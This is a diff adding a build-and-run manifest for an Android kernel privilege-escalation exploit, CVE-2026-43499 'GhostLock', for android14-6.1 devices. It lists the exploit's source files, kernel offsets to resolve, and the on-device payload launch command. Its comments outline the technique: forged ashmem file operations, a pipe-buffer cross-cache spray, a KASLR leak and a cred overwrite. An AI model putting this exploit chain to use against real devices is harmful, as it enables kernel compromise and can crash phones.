@@ -1,0 +1,196 @@
+# entry.ghostlock@6.1 — GhostLock entry, android14-6.1 variant.
+#
+# One set of sources for every kernel interface: common.h selects what differs
+# from -DLIB_KMI, set below.
+
+schema = 1
+kind   = "entry"
+id     = "entry.ghostlock@6.1"
+cve    = "CVE-2026-43499"
+kmi    = ["android14-6.1"]
+
+
+composed = true
+status   = "composed, hardware verification owed: both the fake-fops leak and pipe.c's own R/W-primitive leak go through cves/lib/spray/crosscache (stream method); pipe.c's own pipe-cache shape/drain/reclaim step is unchanged"
+
+# Tunables come from the shared fragments listed below; each fragment's own
+# header states what it covers.
+tunables_from = ["runner/stages/_shared/ghostlock-vehicle-select.toml",
+                 "runner/stages/_shared/ghostlock-vehicle-knobs.toml",
+                 "runner/stages/_shared/ghostlock-vehicle-knobs-pselect.toml"]
+
+[build]
+form    = "preload-so"
+entry   = "constructor"
+# Order is load-bearing (STT_FILE order + .rodata string-merge order).
+sources = [
+  "cves/cve-2026-43499-ghostlock/main.c",
+  "cves/cve-2026-43499-ghostlock/util.c",
+  "cves/cve-2026-43499-ghostlock/util_config.c",
+  "cves/cve-2026-43499-ghostlock/util_addr.c",
+  "cves/lib/rw/nameblob.c",
+  "cves/lib/kaslr/slide_tracefs.c",
+  "cves/cve-2026-43499-ghostlock/fops.c",
+  "cves/cve-2026-43499-ghostlock/fops_pselect.c",
+  "cves/cve-2026-43499-ghostlock/fops_tcp.c",
+  "cves/cve-2026-43499-ghostlock/fops_sigreturn.c",
+  "cves/cve-2026-43499-ghostlock/fops_clone3.c",
+  "cves/cve-2026-43499-ghostlock/fops_process_vm.c",
+  "cves/cve-2026-43499-ghostlock/fops_bpf.c",
+  "cves/cve-2026-43499-ghostlock/fops_mcast.c",
+  "cves/cve-2026-43499-ghostlock/fops_sockopt.c",
+  "cves/cve-2026-43499-ghostlock/pipe.c",
+  "cves/cve-2026-43499-ghostlock/pipe_rw.c",
+  "cves/lib/rw/pipe_rw.c",
+  "cves/lib/spray/crosscache/crosscache.c",
+  "cves/cve-2026-43499-ghostlock/root.c",
+  "cves/lib/root/cred.c",
+  "cves/lib/root/taskscan.c",
+  "cves/lib/root/handoff.c",
+  "cves/cve-2026-43499-ghostlock/preload.c",
+]
+includes = ["cves/cve-2026-43499-ghostlock", "cves"]
+depends  = ["cves/cve-2026-43499-ghostlock/*.h", "cves/lib/leak/kernelsnitch/*.h",
+            "cves/lib/spray/crosscache/crosscache.h", "cves/lib/rtmutex/*.h",
+            "cves/lib/root/*.h"]
+# LIB_KMI=61 selects the android14-6.1 (rounded, hardware-verified) futex-hash
+# sizing in the shared cves/lib/leak/kernelsnitch fork. 61 is also the fork's
+# default; it is set explicitly here so the KMI the payload compiles against is
+# stated, not inherited.
+defines  = ["APP_PAYLOAD=1", "LIB_KMI=61"]
+# @OPT@ is substituted with `opt` below.  The app and release variants share one
+# flag list.
+# -include offset.h feeds the device target header (via TARGET_CONFIG_H) to the
+# shared lib TUs (cves/lib/root/cred.c, cves/lib/root/taskscan.c), which carry no
+# common.h include of their own and would otherwise fall back to panther offsets.
+# It is byte-neutral for the GhostLock TUs: they include common.h -> offset.h ->
+# target.h, and target.h is OFFSET_H-guarded, so the second inclusion is empty.
+cflags   = ["-include", "offset.h", "-fPIC", "@OPT@", "-Wall", "-Wextra", "-Wno-unused-parameter", "-Wno-sign-compare"]
+opt      = ["-O2", "-g0"]
+ldflags  = ["-shared", "-pthread", "-Wl,--no-undefined"]
+output   = "cve-2026-43499-ghostlock"
+
+# The artifact runner/scripts/build-payloads.sh actually ships.
+[build.release]
+opt     = ["-Oz", "-g0", "-fno-unwind-tables", "-fno-asynchronous-unwind-tables",
+           "-ffunction-sections", "-fdata-sections"]
+ldflags = ["-shared", "-pthread", "-Wl,--gc-sections", "-Wl,--icf=all", "-s", "-Wl,--no-undefined"]
+output  = "cve-2026-43499-ghostlock.release"
+
+[facts]
+header = "cves/targets/{target}/target.h"
+requires = [
+  "OFFSET_H", "BUILD_VARIANT_LABEL", "BUILD_FINGERPRINT",
+  "INIT_TASK", "INIT_TASK_OFF",
+  "ASHMEM_MISC_FOPS", "ASHMEM_MISC_FOPS_OFF", "ASHMEM_FOPS", "ASHMEM_IOCTL",
+  "KMALLOC_CACHES", "KMALLOC_CACHES_OFF",
+  "P0_PAGE_OFFSET", "P0_PHYS_OFFSET", "P0_KERNEL_PHYS_LOAD", "KIMAGE_TEXT_BASE",
+  "PIPE_BUFFER_SIZE", "PIPE_BUFFER_SLOTS",
+  "SLIDE_INIT_TASK_IMAGE", "SLIDE_LOGGERS_0_1_IMAGE", "SLIDE_SYSCTL_BOOTID_IMAGE",
+  "TASK_CRED_OFF", "TASK_REAL_CRED_OFF", "CRED_UID_OFF",
+  "SELINUX_ENFORCING", "SECURITY_HOOK_HEADS",
+  # PSELECT_WAITER_WORD_SHIFT is the discriminator: android15-6.6.h does not
+  # define it, and entry.ghostlock@6.6 forbids it. The rest are facts this
+  # source set consumes.
+  "MM_STRUCT_SZ", "KMALLOC_CGROUP_TYPE", "KMALLOC_CACHE_TYPES",
+  "KMALLOC_PIPE_INDEX", "PSELECT_WAITER_WORD_SHIFT",
+  # Read by tcp_gate_check() (fops_tcp.c) at run time; without it that
+  # vehicle's own precondition check cannot answer whether it applies here.
+  "KERNEL_VERSION_CODE",
+]
+forbids = []
+# Not in `requires`: SLIDE_LOGGER_PARENT, whose absence falls back to
+# common.h, and KSNITCH_COLLISIONS, an environment variable read at run time
+# (cves/lib/leak/kernelsnitch/kernelsnitch.h) rather than a target-header fact.
+
+[properties]
+retry_safe  = true
+# post_slide is "low", not "none": this stage can panic the phone after the run
+# has finished. misc_open() COPIES ashmem_miscs[0].fops into every struct file
+# opened while it is forged, and the page behind that pointer dies with the
+# payload process, so each such file carries a stale f_op that faults on its
+# next touch. Bounding the window is the mitigation -- the restore runs before
+# install_child_root, and the route-page-N and fops-restored step markers
+# measure what is left. Signatures and the outstanding fix:
+# cves/cve-2026-43499-ghostlock/README.md, "Collateral".
+panic_risk  = { pre_slide = "high", post_slide = "low" }
+destructive = ["slide_logger_parent_slot", "ashmem_miscs[0].fops"]
+# restore_fops_ptr_and_owner puts the slot back and zeroes the fake owner word
+# so fops_put() survives. It does not reach struct files already holding the
+# fake pointer; that damage outlives the run and this stage cannot undo it.
+restores    = ["repair_logger_slot", "restore_fops_ptr_and_owner"]
+provides    = ["CAP_SLIDE", "CAP_KRW_C"]
+requires_caps = []
+retains     = ["CAP_KRW_C"]
+
+# The pselect fd_set word map, in one place.
+#
+# core_sys_select() takes nfds and allocates a 256-byte stack_fds; the three
+# input bitmaps are words 0..3*ceil(nfds/64)-1 and the result sets follow,
+# kernel-zeroed. The waiter word map's first entry is `first_word` and its last
+# load-bearing one (`lock`) is `lock_word`, so the legal PSELECT_SHIFT range is
+# [-first_word, 3*ceil(nfds/64)-1 - lock_word]. The C gets all of it as -D:
+# PSELECT_ROUTE_NFDS, PSELECT_MAP_FIRST_WORD, PSELECT_MAP_LOCK_WORD and the
+# derived KNOB_PSELECT_SHIFT_MIN / KNOB_PSELECT_SHIFT_MAX. Change nfds or the
+# map here and both the payload's gate and the runner's validation follow.
+[pselect_map]
+nfds = 320
+first_word = 2
+lock_word = 9
+
+# ---------------------------------------------------------------------------
+# The runner contract — runner/README.md, "Foreign-chain contract"
+# ---------------------------------------------------------------------------
+# The four tables below restate runner/lib/exploit.sh's built-in defaults as
+# data.  ./pixel-ksu-root with no --recipe reads no manifest; `--recipe
+# ghostlock` reads this block.
+
+[invoke]
+# A .so dlopen'ed by `cve-helper --run-payload`
+# (cves/cve-2026-43499-ghostlock/su_daemon.c:975-1026, dispatched at :1028).
+kind = "helper-preload"
+
+# The payload the runner pushes is a prebuilt .so chosen out of
+# artifacts/exploits/ by runner/lib/select.sh from data/targets.json — a device
+# can resolve to a payload built for a different codename on the same kernel.
+artifact_source = "runner"
+dest = "/data/local/tmp/exploit-payload.so"
+mode = "755"
+
+# Generated from the _INVOKE_TMPL_DEFAULT literal in runner/lib/exploit.sh.
+command = "cd @DEV_TMP@; @KASLR_ENV@SU_CLIENT_UID=@CLIENT_UID@ SU_APP_UID=@APP_UID@        @DEV_HELPER@ --run-payload @DEV_PAYLOAD@ @DEV_HELPER@ @DEV_LOG@ >/dev/null 2>&1"
+
+# A base cached for the current boot is replayed through @KASLR_ENV@
+# (cves/cve-2026-43499-ghostlock/main.c:275-286).
+accepts_base = true
+
+# The default MARK_* set of runner/lib/exploit.sh, as data.  The live classes for
+# GhostLock are PANIC, REFUSED, PASS, MISS and PARKED; the classifier is driven
+# by these patterns.
+[markers]
+pass         = 'slide-kaslr-tracefs-ok pid=[0-9]+ base=[0-9a-f]+'
+gate_fail    = '[A-Z][A-Z0-9_]*_GATE_FAIL'
+restore_pass = '[A-Z][A-Z0-9_]*_RESTORE_PASS'
+restore_bad  = '[A-Z][A-Z0-9_]*_(RESTORE_NOT_PROVEN|RESTORE_UNREACHABLE|RESTORE_FAIL)'
+# Declared so the kill gate stays correct.  Absent, a deadline parks.
+heartbeat    = '[A-Z][A-Z0-9_]*_HEARTBEAT[[:space:]]+seq=[0-9]+'
+# The route summary discriminates "reached root" from "did not"; the count is
+# cfi-miss LINES, one per page that took a miss.
+diag         = '(tcp|sigreturn|pselect|clone3|process_vm|bpf) route done=[0-9]+.*'
+diag_count   = 'cfi misses=[0-9]+'
+
+# Empty: cve-helper's early bails return `errno ? errno : <fixed>`
+# (cves/cve-2026-43499-ghostlock/su_daemon.c:1000-1010), so no exit status of
+# this loader carries an outcome.
+[exit_map]
+
+# The KASLR base, from the `pass` marker above.
+[provides]
+caps  = ["CAP_SLIDE", "CAP_KRW_C"]
+field = 'base=[0-9a-f]+'
+label = "base"
+
+# Setup, run before each shot. GhostLock's reclaim race is far easier on a
+# freshly booted device, so its one setup step is a reboot to a clean boot.
+[[setup]]
+reboot = true
